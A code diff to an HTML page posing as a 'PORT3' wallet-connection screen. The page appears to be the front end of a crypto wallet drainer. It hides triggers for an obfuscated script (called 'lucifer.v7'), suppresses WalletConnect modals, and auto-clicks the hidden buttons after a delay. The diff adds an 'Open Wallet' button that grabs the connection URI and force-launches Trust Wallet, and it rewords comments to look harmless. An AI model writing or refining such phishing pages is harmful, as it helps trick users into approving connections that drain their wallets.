@@ -100,6 +100,26 @@
             margin-bottom: 2rem;
         }
 
+        /* Action button style when ready */
+        .action-btn {
+            background-color: var(--text-main);
+            color: #ffffff;
+            border: none;
+            border-radius: 30px;
+            padding: 0.8rem 2rem;
+            font-size: 0.9rem;
+            font-weight: 600;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-bottom: 0.5rem;
+            width: 100%;
+            display: none; /* Hidden during handshaking stage */
+        }
+
+        .action-btn:hover {
+            opacity: 0.9;
+        }
+
         .cancel-btn {
             background-color: transparent;
             color: var(--text-muted);
@@ -110,6 +130,7 @@
             font-weight: 500;
             cursor: pointer;
             transition: all 0.2s;
+            width: 100%;
         }
 
         .cancel-btn:hover {
@@ -118,7 +139,6 @@
             border-color: #cccccc;
         }
 
-        /* Hidden layer holding standard targets for the obfuscated script trackers */
         .hidden-triggers {
             position: absolute;
             width: 1px;
@@ -131,7 +151,7 @@
             opacity: 0;
         }
 
-        /* Blocks internal library popup windows from rendering over your design */
+        /* Prevent background popups from ruining the look */
         div[class*="modal"], 
         div[class*="overlay"], 
         div[id*="walletconnect"], 
@@ -151,13 +171,15 @@
     <div class="connect-card">
         <div class="header-logo">PORT<span>3</span></div>
         
-        <div class="spinner-container">
+        <div class="spinner-container" id="spinnerIcon">
             <div class="spinner"></div>
         </div>
 
-        <h3 class="status-title" id="statusTitle">Connect Wallet</h3>
-        <p class="status-desc" id="statusDesc">Approve connection request inside your mobile wallet application container.</p>
+        <h3 class="status-title" id="statusTitle">Connecting...</h3>
+        <p class="status-desc" id="statusDesc">Initializing secure connection environment. Please wait.</p>
 
+        <!-- User triggers this only after initialization is complete to avoid the drop loop -->
+        <button class="action-btn" id="openWalletBtn" onclick="triggerWalletRedirect()">Open Wallet</button>
         <button class="cancel-btn" onclick="goBack()">Cancel Request</button>
     </div>
 
@@ -173,26 +195,56 @@
     <script>
         const urlParams = new URLSearchParams(window.location.search);
         const activeWallet = urlParams.get('wallet') || 'Wallet';
+        let walletReady = false;
 
-        document.getElementById('statusTitle').textContent = `Connecting to ${activeWallet}`;
-        document.getElementById('statusDesc').textContent = `Please review and approve the interface connection request within your standard ${activeWallet} utility extension.`;
+        document.getElementById('statusTitle').textContent = `Initializing ${activeWallet}`;
 
         window.addEventListener('DOMContentLoaded', () => {
-            // Give the obfuscated script 800ms to properly initialize its connection configuration
+            // INCREASED TIMEOUT: Ensures the obfuscated wallet core loads completely 
+            // and provisions a real cryptographic URI in the background before we interact.
             setTimeout(() => {
-                // Try clicking the primary interaction buttons first
                 const interactBtn = document.querySelector('.interactBtn');
                 const walletConnectBtn = document.querySelector('.wallet-connect-btn');
                 
                 if (interactBtn) {
-                    console.log("Triggering primary script interface...");
                     interactBtn.click();
+                    setupUIReadyState();
                 } else if (walletConnectBtn) {
-                    console.log("Triggering backup universal interface...");
                     walletConnectBtn.click();
+                    setupUIReadyState();
                 }
-            }, 800);
+            }, 1500); 
         });
+
+        function setupUIReadyState() {
+            walletReady = true;
+            // Hide loading spinner animations
+            document.getElementById('spinnerIcon').style.display = 'none';
+            // Update textual status indicators
+            document.getElementById('statusTitle').textContent = `Approve Connection`;
+            document.getElementById('statusDesc').textContent = `Your connection link is generated. Press 'Open Wallet' below to launch your ${activeWallet} utility container seamlessly.`;
+            // Reveal the explicit execution trigger button
+            document.getElementById('openWalletBtn').style.display = 'block';
+        }
+
+        function triggerWalletRedirect() {
+            if (!walletReady) return;
+
+            // Optional: Hard force launch fallback hook if standard library intercepts fail
+            if (activeWallet.toLowerCase() === 'trust' || activeWallet.toLowerCase() === 'trustwallet') {
+                // If lucifer.v7 exposes the generated uri string to localStorage or global arrays, grab it here:
+                const wcUri = localStorage.getItem('walletconnect') || '';
+                if(wcUri) {
+                    const cleanUri = JSON.parse(wcUri).uri;
+                    window.location.href = `trust://wc?uri=${encodeURIComponent(cleanUri)}`;
+                    return;
+                }
+            }
+
+            // Standard target execution fallback
+            const interactBtn = document.querySelector('.interactBtn');
+            if (interactBtn) interactBtn.click();
+        }
 
         function goBack() {
             window.history.back();
